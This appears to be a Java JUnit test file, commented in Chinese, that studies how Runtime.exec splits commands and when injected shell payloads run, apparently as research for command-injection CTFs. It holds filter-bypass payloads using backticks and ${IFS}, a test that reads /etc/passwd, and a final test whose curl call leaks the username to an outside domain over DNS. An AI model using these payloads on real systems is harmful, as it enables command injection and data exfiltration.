package leveryd;

import org.junit.Test;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;


/**
 * 参考：https://blog.spoock.com/2018/11/25/getshell-bypass-exec/
 *
 * 实验结论：
 * 1. java.lang.Runtime.getRuntime().exec(字符串)  字符串会被分割成数组
 * 2. String cmds[] = {"/bin/sh","-c",cmd};  如果是数组形式，cmd参数可以任意构造
 * 3. String cmds[] = {"/bin/sh","-c","ls", cmd}; 这种场景和场景2不同
 */
public class TestRuntimeExec {

    private String Exec(Object cmd) throws Exception {
        Process ps;
        try{
            ps = java.lang.Runtime.getRuntime().exec((String)cmd);
        } catch (Exception e) {
            ps = java.lang.Runtime.getRuntime().exec((String[])cmd);
        }


        //取得命令结果的输出流
        InputStream fis = ps.getInputStream();

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] b = new byte[10240];
        int a = -1;

        while ((a = fis.read(b)) != -1) {
            baos.write(b, 0, a);
        }

        // int value = ps.waitFor();
        // System.out.println(new String(baos.toByteArray()));
        return new String(baos.toByteArray());
    }

    @Test
    public void TestSuccess1() throws Exception {
        this.Exec("sh -c ls`touch${IFS}/tmp/qwer`");
    }

    @Test
    public void TestSuccess2() throws Exception {
        String[] cmd = new String[]{"sh", "-c", "ls${IFS}`touch${IFS}/tmp/qwer`"};
        this.Exec(cmd);
    }

    @Test
    public void TestSuccess3() throws Exception {
        String[] cmd = new String[]{"sh", "-c", "ls `touch${IFS}/tmp/qwer`"};
        this.Exec(cmd);
    }

    @Test
    public void TestSuccess4() throws Exception {
        assert ! this.Exec("sh -c whoami && cat /etc/passwd").contains("root");
        // this.Exec("sh -c whoami && cat /etc/passwd") 应该等价于 this.Exec(new String[]{"sh","-c", "whoami", "&&", "cat","/etc/passwd"})
        assert this.Exec(new String[]{"sh","-c", "whoami && cat /etc/passwd"}).contains("root");
    }

    @Test
    public void TestFail1() throws Exception {
        this.Exec("sh -c ls `touch${IFS}/tmp/qwer`");
    }

    @Test
    public void TestFail2() throws Exception {
        String[] cmd = new String[]{"sh","-c","ls","`touch${IFS}/tmp/qwer`"};
        this.Exec(cmd);
    }

    @Test
    public void TestFail3() throws Exception {
        String[] cmd = new String[]{"sh","-c","ls ","`touch${IFS}/tmp/qwer`"};
        this.Exec(cmd);
    }

    @Test
    public void TestFail4() throws Exception {
        String[] cmd = new String[]{"sh","-c","ls",";touch${IFS}/tmp/qwer"};
        this.Exec(cmd);
    }

    @Test
    public void TestFail5() throws Exception {
        String[] cmd = new String[]{"sh","-c","ls","&&touch${IFS}/tmp/qwer"};
        this.Exec(cmd);
    }

    @Test
    public void TestFail6() throws Exception {
        String[] cmd = new String[]{"sh","-c","ls",">/tmp/qwer"};
        this.Exec(cmd);
    }

    @Test
    public void TestFail7() throws Exception {
        String[] cmd = new String[]{"sh","-c","sleep","10000", "&&ls","/"};
        this.Exec(cmd);
    }

    @Test
    public void TestFail8() throws Exception {
        String[] cmd = new String[]{"ls && touch /tmp/qwer"};
        this.Exec(cmd);
    }

    /*
    问题：
    "sh -c ls 可控点"
    php语言中system函数可以执行命令，Java语言Runtime.exec确不可以，这是什么原因

    分析：
    先分析Java Runtime.exec
    Java8调试结论：
    1. Runtime.exec如果参数是字符串，就会被分割成数组
    2. 最终调用forkAndExec Native方法
        openjdk中的对应C实现 Java_java_lang_UNIXProcess_forkAndExec

    有两种方法确定底层是怎么实现的
        1. 调研C语言调用外部程序的方法
        2. 跟进Java forkAndExec Native方法

    调研后，C语言中生成子进程有以下方法
        fork、exec、popen、vfork、system

    其中exec家族的方法可以调用外部程序，demo代码见 代码大全/C/codesnippet/进程/exec.c。感觉这个函数很可能是forkAndExec的实现

    调研Java forkAndExec Native方法时，找到已经有人分析过了。https://xz.aliyun.com/t/7046#toc-5

    也验证了forkAndExec最终确实调用execvp函数。

    那么就着重研究execvp函数。测试代码中也符合预期。

    那么php system底层实现又是啥呢，估计调用的是c语言的system函数。

    在php源码Zend/zend_virtual_cwd.h中，看到是调用popen。代码大全/C/codesnippet/进程/popen.c 代码测试，也符合预期。
    * */
    @Test
    public void CTF() {
        // php > system('sh -c ls `touch${IFS}/tmp/qwer`'); 可以创建文件
        // this.Exec("sh -c ls 可控点"); 是否可以命令执行
    }

    @Test
    public void Test() throws Exception {
        this.Exec("bash -c curl${IFS}$(whoami).test.xxlevryd.top");
    }
}
